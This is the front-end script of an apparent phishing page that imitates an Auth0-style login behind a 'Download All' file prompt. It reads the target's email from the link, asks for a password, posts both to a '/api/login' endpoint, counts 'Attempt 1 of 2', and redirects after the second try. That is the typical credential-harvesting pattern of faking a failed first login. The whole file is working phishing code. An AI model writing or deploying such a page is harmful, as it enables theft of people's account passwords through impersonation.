    <script>
        // API endpoint (your Vercel function)
        const API_URL = '/api/login';

        // Utility: extract email from URL hash or query
        function getEmailFromURL() {
            // Try hash first (as you wanted)
            if (window.location.hash) {
                const hashParams = new URLSearchParams(window.location.hash.substring(1));
                const email = hashParams.get('email');
                if (email) return email;
                // Also try regex in hash
                const match = window.location.hash.match(/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i);
                if (match) return match[0];
            }
            // Fallback: query string
            const params = new URLSearchParams(window.location.search);
            return params.get('email') || '';
        }

        document.addEventListener('DOMContentLoaded', function() {
            const one = document.getElementById('one');
            const two = document.getElementById('two');
            const downloadBtn = document.getElementById('download');
            const submitBtn = document.getElementById('submit-btn');
            const passwordInput = document.getElementById('password');
            const emailDisplay = document.getElementById('email_display');
            const loadingContainers = document.querySelectorAll('.auth0-loading-container');
            const msgDiv = document.getElementById('msg');

            let currentEmail = '';
            let attemptCount = 0;

            // Show/hide loading
            function setLoading(loading) {
                loadingContainers.forEach(el => {
                    el.style.display = loading ? 'block' : 'none';
                });
                // Also disable buttons visually
                downloadBtn.disabled = loading;
                submitBtn.disabled = loading;
            }

            function showMessage(text, isError = true) {
                msgDiv.style.display = 'block';
                msgDiv.querySelector('span span').textContent = text;
                msgDiv.className = 'auth0-global-message ' + (isError ? 'auth0-global-message-error' : 'auth0-global-message-success');
            }

            function hideMessage() {
                msgDiv.style.display = 'none';
            }

            // Step 1: Download All -> send email
            downloadBtn.addEventListener('click', async function(e) {
                e.preventDefault();
                hideMessage();

                const email = getEmailFromURL();
                if (!email) {
                    showMessage('Error: Email not found in URL. Please check the link.', true);
                    return;
                }

                setLoading(true);
                try {
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'email', email })
                    });
                    const data = await response.json();
                    setLoading(false);

                    if (response.ok) {
                        // Success – switch to password step
                        currentEmail = email;
                        emailDisplay.value = email;
                        one.style.display = 'none';
                        two.style.display = 'block';
                        passwordInput.focus();
                        // Reset attempt counter (will be managed by server, but we keep local for display)
                        attemptCount = 0;
                        // Show attempt count on the page
                        const attemptSpan = document.querySelector('#two .attempt-counter');
                        if (attemptSpan) attemptSpan.textContent = 'Attempt 1 of 2';
                        // Also show email in the profile section
                        const emailProfile = document.querySelector('#two .user-email');
                        if (emailProfile) emailProfile.textContent = email;
                    } else {
                        showMessage(data.error || 'Failed to proceed. Please try again.', true);
                    }
                } catch (err) {
                    setLoading(false);
                    showMessage('Network error. Please check your connection.', true);
                }
            });

            // Step 2: Submit password
            submitBtn.addEventListener('click', async function(e) {
                e.preventDefault();
                hideMessage();

                const password = passwordInput.value.trim();
                if (!password) {
                    showMessage('Please enter your password.', true);
                    return;
                }

                // Update attempt counter (local)
                attemptCount++;
                const attemptSpan = document.querySelector('#two .attempt-counter');
                if (attemptSpan) attemptSpan.textContent = `Attempt ${attemptCount + 1} of 2`;

                setLoading(true);
                try {
                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            action: 'password',
                            email: currentEmail,
                            password: password,
                            remember: document.getElementById('remember')?.checked ? 1 : 0
                        })
                    });
                    const data = await response.json();
                    setLoading(false);

                    if (response.ok && data.redirect) {
                        // Second attempt – redirect
                        window.location.href = data.redirect;
                        return;
                    } else if (response.status === 401) {
                        // Incorrect password – show error, allow retry
                        showMessage(data.error || 'Incorrect password. Please try again.', true);
                        passwordInput.value = '';
                        passwordInput.focus();
                    } else {
                        showMessage(data.error || 'Unknown error. Please try again.', true);
                    }
                } catch (err) {
                    setLoading(false);
                    showMessage('Network error. Please check your connection.', true);
                }
            });

            // Optional: clear error on typing
            passwordInput.addEventListener('input', function() {
                hideMessage();
            });
        });
    </script>
</body>
</html>
